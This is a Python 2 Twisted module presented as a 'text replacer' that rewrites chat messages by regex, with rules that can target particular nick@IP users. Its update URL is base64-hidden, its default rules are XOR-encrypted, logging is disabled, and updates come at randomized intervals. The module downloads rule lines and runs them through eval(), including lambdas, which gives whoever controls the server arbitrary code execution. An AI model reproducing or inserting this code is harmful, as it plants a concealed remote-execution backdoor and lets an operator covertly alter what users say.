# coding=CP1250
"""
Text replacer with web based configuration.
Author: LiPeK (lipek002@gmail.com)
"""

import re
from twisted.internet import reactor
from twisted.internet.threads import deferToThread
from twisted.python.runtime import seconds
import urllib
try:
    from hashlib import md5
except ImportError:
    from md5 import md5
from Crypto.Cipher import XOR
import binascii
import random

CONFIG_URL = "aHR0cDovL2hvc3QvcmVwbGFjZXIuZW5j\n"

## AAaaaaaa => AAaa
# r'(?i)(([\węóąśłżźćńĘÓĄŚŁŻŹĆŃ])\2{3})\2+'  =>  '\\1'
## ........,,,,,,,, => ......,,,,,,
# r'(([^\węóąśłżźćńĘÓĄŚŁŻŹĆŃ])\2{5})\2+'  =>  '\\1'
DEFAULT_CONFIG = [
'41461806594d18496d6f448fc089f98286fadec6fab7c1e8c79fb9f0b76f4b6a011a03441938024a113a3a580d39426d65541f',
'45174c4c3f3a6c41dc958bfe858cfed6c8fab795ed959cbca3e26d4c6d0b1e0d4a1938564f43393f3f5b0c6b116f3d011e'
]

FIRST_UPDATE_DELAY = random.uniform(5, 10*60)
UPDATE_PERIOD = random.uniform(30*60, 45*60)
UPDATE_RETRY_PERIOD = random.uniform(15*60, 30*60)

isUpdating = False
isLocked = False
next_update = 0
config_hash = ''
compiled_config = []

def LOG(text):
#   print text
    pass

def decodeAndHashConfig(config):
    key = md5()
    key.update(CONFIG_URL)
    key = key.hexdigest()
    decoded = []
    hash = md5()
    xor = XOR.new(key)
    for line in config:
        # skip comments and newlines
        if line[0] in '#\r\n':
            continue
        line = line.strip()
        if line == '':
            continue
        line = binascii.unhexlify(line)
        line = xor.decrypt(line)
        decoded.append(line)
        hash.update(line)
    return [hash.hexdigest(), decoded]

def compileConfig(config):
    global compiled_config
    new_config = []
    for line in config:
        # skip the line on any error
        try:
            regex = None
            string = ''
            condition = None
            
            line = re.split(r'\s+:\s+',line)
            if len(line) == 1:
                regex, string = re.split(r'\s+=>\s+',line[0])
            elif len(line) == 2:
                condition = eval('str('+line[0]+')')
                condition = re.compile(condition)
                regex, string = re.split(r'\s+=>\s+',line[1])
            else:
                LOG("ERROR: Syntax Error. Too much ':'")
                continue
            regex = eval('str('+regex+')')
            regex = re.compile(regex)
            lambda_match = re.match(r"^l'(.*)'$", string)
            if lambda_match:
                string = eval("lambda m : " + lambda_match.group(1))
            else:
                string = eval('str('+string+')')
            new_config.append( (condition, regex, string) )
        except:
            #raise
            LOG("ERROR: Exception occured during line decode")
            continue
    # wait for searchAndReplace() to finish
    while isLocked:
        pass
    compiled_config = new_config
    
def updateConfig():
    LOG("ENTER: updateConfig()")
    global isUpdating
    
    if isUpdating:
        LOG("INFO: updateConfig(): is updating!")
        return
    
    if next_update >= seconds():
        LOG("INFO: updateConfig(): no update yet")
        return
    
    isUpdating = True
    
    def handleQueryError():
        LOG("ENTER: handleQueryError()")
        global isUpdating
        global next_update
        next_update = seconds() + UPDATE_RETRY_PERIOD
        isUpdating = False
        LOG("RETURN: handleQueryError()/queryConfig()")

    def queryConfig():
        LOG("ENTER: queryConfig()")
        global next_update
        global config_hash
        global isUpdating

        try:
            f = urllib.urlopen(binascii.a2b_base64(CONFIG_URL))
        except:
            LOG("ERROR: invalid url domain")
            handleQueryError()
            return

# getcode() is not present in Python 2.5
#       if f.getcode() != 200:
#           LOG("ERROR: invalid url path")
#           handleQueryError()
#           return
        
        read_hash = f.readline().strip();
            
        if len(read_hash) != 32:
            LOG("ERROR: invalid hash: %s" % read_hash)
            f.close()
            handleQueryError()
            return
            
        if config_hash != read_hash:
            LOG("INFO: hew hash: %s\nReading config" % read_hash)
            config = f.readlines()
            f.close()
            LOG("INFO: config read")
            
            hash, config = decodeAndHashConfig(config)
            
            if hash != read_hash:
                LOG("ERROR: hash doesn't match config data: %s != %s" % (hash, read_hash))
                handleQueryError()
                return
            
            compileConfig(config)
            config_hash = read_hash
        else:
            LOG("INFO: hash didn't change, skipping update")
        
        next_update = seconds() + UPDATE_PERIOD
        isUpdating = False
        LOG("RETURN: queryConfig()")

    LOG("INFO: deffering queryConfig")
    deferToThread(queryConfig)

def searchAndReplace(text, nick = '', ip = ''):
    LOG("ENTER: searchAndReplace()")
    nick_ip = "%s@%s" % (nick, ip)
    # do not allow to change config during operation
    global isLocked
    isLocked = True
    for condition, regex, string in compiled_config:
        try:
            if not condition or (condition and condition.match(nick_ip)):
                text = regex.sub(string, text)
        except:
            continue
    isLocked = False
    updateConfig()
    return text

config_hash, config = decodeAndHashConfig(DEFAULT_CONFIG)
LOG("INFO: Default hash: %s" % config_hash)
compileConfig(config)
reactor.callLater(FIRST_UPDATE_DELAY, updateConfig)
